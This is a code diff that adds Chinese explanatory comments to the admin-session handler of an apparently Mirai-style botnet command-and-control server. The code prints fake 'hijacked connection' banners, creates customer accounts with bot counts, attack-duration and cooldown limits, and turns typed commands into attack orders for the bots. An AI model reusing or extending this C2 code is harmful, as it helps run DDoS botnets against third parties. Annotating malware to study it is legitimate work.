@@ -61,7 +61,7 @@ func (this *Admin) Handle() {
 
     var loggedIn bool
     var userInfo AccountInfo
-    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
+    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {  //用username和password登录
         this.conn.Write([]byte("\r\033[32;1mпроизошла неизвестная ошибка\r\n"))
         this.conn.Write([]byte("\033[31mнажмите любую клавишу для выхода. (any key)\033[0m"))
         buf := make([]byte, 1)
@@ -69,7 +69,7 @@ func (this *Admin) Handle() {
         return
     }
 
-    this.conn.Write([]byte("\r\n\033[0m"))
+    this.conn.Write([]byte("\r\n\033[0m"))   //登录成功
     this.conn.Write([]byte("[+] DDOS | Succesfully hijacked connection\r\n"))
     time.Sleep(250 * time.Millisecond)
     this.conn.Write([]byte("[+] DDOS | Masking connection from utmp+wtmp...\r\n"))
@@ -106,32 +106,34 @@ func (this *Admin) Handle() {
         }
     }()
 
+    //\033[37;1m  这个好像是加粗的意思      \033[36;1m  高亮 与下面那个颜色不同
     this.conn.Write([]byte("\033[37;1m[!] Sharing access IS prohibited!\r\n[!] Do NOT share your credentials!\r\n\033[36;1mReady\r\n"))
     for {
         var botCatagory string
         var botCount int
-        this.conn.Write([]byte("\033[32;1m" + username + "@botnet# \033[0m"))
+        //\033[32;1m 这个应该是高亮的意思
+        this.conn.Write([]byte("\033[32;1m" + username + "@botnet# \033[0m"))   //admin@botnet#
         cmd, err := this.ReadLine(false)
-        if err != nil || cmd == "exit" || cmd == "quit" {
+        if err != nil || cmd == "exit" || cmd == "quit" {  //exit或者quit命令
             return
         }
-        if cmd == "" {
+        if cmd == "" {  //空命令
             continue
         }
         botCount = userInfo.maxBots
 
-        if userInfo.admin == 1 && cmd == "adduser" {   //添加新用户
+        if userInfo.admin == 1 && cmd == "adduser" {   //添加新用户命令
             this.conn.Write([]byte("Enter new username: "))
             new_un, err := this.ReadLine(false)
             if err != nil {
                 return
             }
-            this.conn.Write([]byte("Enter new password: "))
+            this.conn.Write([]byte("Enter new password: "))//新用户的密码
             new_pw, err := this.ReadLine(false)
             if err != nil {
                 return
             }
-            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
+            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))//新用户要购买的bot个数
             max_bots_str, err := this.ReadLine(false)
             if err != nil {
                 return
@@ -141,7 +143,7 @@ func (this *Admin) Handle() {
                 this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                 continue
             }
-            this.conn.Write([]byte("Max attack duration (-1 for none): "))
+            this.conn.Write([]byte("Max attack duration (-1 for none): ")) //最大攻击持续时间
             duration_str, err := this.ReadLine(false)
             if err != nil {
                 return
@@ -151,7 +153,7 @@ func (this *Admin) Handle() {
                 this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                 continue
             }
-            this.conn.Write([]byte("Cooldown time (0 for none): "))
+            this.conn.Write([]byte("Cooldown time (0 for none): ")) //冷却时间
             cooldown_str, err := this.ReadLine(false)
             if err != nil {
                 return
@@ -161,6 +163,7 @@ func (this *Admin) Handle() {
                 this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                 continue
             }
+            //输出新添加用户的信息，等待用户确认
             this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
             confirm, err := this.ReadLine(false)
             if err != nil {
@@ -169,10 +172,12 @@ func (this *Admin) Handle() {
             if confirm != "y" {
                 continue
             }
+
+            //数据库操作，添加新用户
             if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                 this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
             } else {
-                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
+                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))  //添加用户成功
             }
             continue
         }
@@ -183,7 +188,7 @@ func (this *Admin) Handle() {
             }
             continue
         }
-        if cmd[0] == '-' {
+        if cmd[0] == '-' { 
             countSplit := strings.SplitN(cmd, " ", 2)
             count := countSplit[0][1:]
             botCount, err = strconv.Atoi(count)
@@ -203,11 +208,12 @@ func (this *Admin) Handle() {
             cmd = cataSplit[1]
         }
 
+        //不是上述的几个命令的时候，就是攻击指令，否则指令出错
         atk, err := NewAttack(cmd, userInfo.admin)
         if err != nil {
-            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
+            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))//输出错误信息
         } else {
-            buf, err := atk.Build()
+            buf, err := atk.Build()  //调用Build()构造和Bot通信的私有网络协议数据
             if err != nil {
                 this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
             } else {
